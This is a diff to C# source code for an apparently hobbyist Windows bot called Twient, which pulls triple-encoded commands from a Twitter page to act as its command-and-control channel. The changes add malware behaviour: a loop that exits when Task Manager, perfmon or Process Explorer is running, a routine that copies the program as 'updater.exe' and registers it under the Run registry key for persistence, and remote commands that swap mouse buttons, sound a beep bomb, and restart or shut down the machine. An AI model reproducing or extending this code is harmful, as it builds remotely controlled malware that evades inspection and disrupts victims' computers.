@@ -1,10 +1,6 @@
 ﻿/*
- * Created by SharpDevelop.
- * User: Adminuser
+ * User: Voraka
  * Date: 6/6/2017
- * Time: 11:05 AM
- * 
- * To change this template use Tools | Options | Coding | Edit Standard Headers.
  */
 using System;
 using System.Windows.Forms;
@@ -15,6 +11,7 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using Microsoft.Win32;
 using System.Reflection;
+using System.Diagnostics;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization.Formatters.Binary;
@@ -78,6 +75,21 @@ namespace Twient
 		}
 		
 		
+		public static void CheckProcess()
+		{
+			while (true)
+			{
+				Process[] processesByName = Process.GetProcessesByName("taskmgr");
+				Process[] processesByName2 = Process.GetProcessesByName("perfmon");
+				Process[] processesByName3 = Process.GetProcessesByName("procexp64");
+				if (processesByName.Length > 0 || processesByName2.Length > 0 || processesByName3.Length > 0)
+				{
+					Functions.SetCritical(0);
+					Environment.Exit(0);
+				}
+				Thread.Sleep(2000);
+			}
+		}
 		
 		public static string readtwitter()
 		{
@@ -98,22 +110,35 @@ namespace Twient
 			return result;
 		}
 		
-		
-		
-		
+		private static void panic(string filepath)
+		{
+			CheckProcess();
+			//File.Copy(text, GlobalVars.Autostart + "\\updater.exe");
+			File.Copy(filepath, GlobalVars.Backpath + "\\updater.exe");
+			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+			registryKey.SetValue("updater", GlobalVars.Backpath + "updater.exe");
+			registryKey.Close();
+		}
 		
 		private static void Main(string[] args)
-		{
+		{			
+			string key = "";
+			string filepath =System.Windows.Forms.Application.ExecutablePath;			
 			string strSource = readtwitter();
 			string msg = Decode(Decode(Decode(getBetween(strSource, Encode(Encode(Encode("COMMAND"))), Encode(Encode(Encode("COMMAND_END")))))));
 			//string between = getBetween(strSource, "COMMAND", "COMMAND_END");
 			//Console.WriteLine(a);
 			Regex regex = new Regex("-CUT-");
 			string[] cut = regex.Split(msg);
-			string key = cut[0];
-			//MessageBox.Show(key);
-			//Console.WriteLine("[*] C&C: "+msg);
-			//Console.WriteLine("[*] cmd: "+key); 
+			key = cut[0];
+			if (key=="")
+			{
+				Functions.SetCritical(0);
+				Environment.Exit(0);
+			}
+			panic(filepath);			
+			
+			 
 			switch (key)
 			{
 				case "crasher":
@@ -210,6 +235,37 @@ namespace Twient
 					{
 					}
 					
+					break;
+				}	
+					
+				case "Swapmousebuttons_on":
+				{
+					Functions.SwapMouseButton(1);
+					break;
+				}
+					
+				case "Swapmousebuttons_off":
+				{
+					Functions.SwapMouseButton(0);
+					break;
+				}
+				
+				case "Beeper_Bomb":
+				{					
+					Thread thread5 = new Thread(new ThreadStart(Functions.Beeper_bomb));
+					thread5.Start();
+					break;
+				}
+					
+				case "Restart":
+				{					
+					Functions.Shutdown(2);
+					break;
+				}	
+				
+				case "Shutdown":
+				{					
+					Functions.Shutdown(1);
 					break;
 				}	
 					
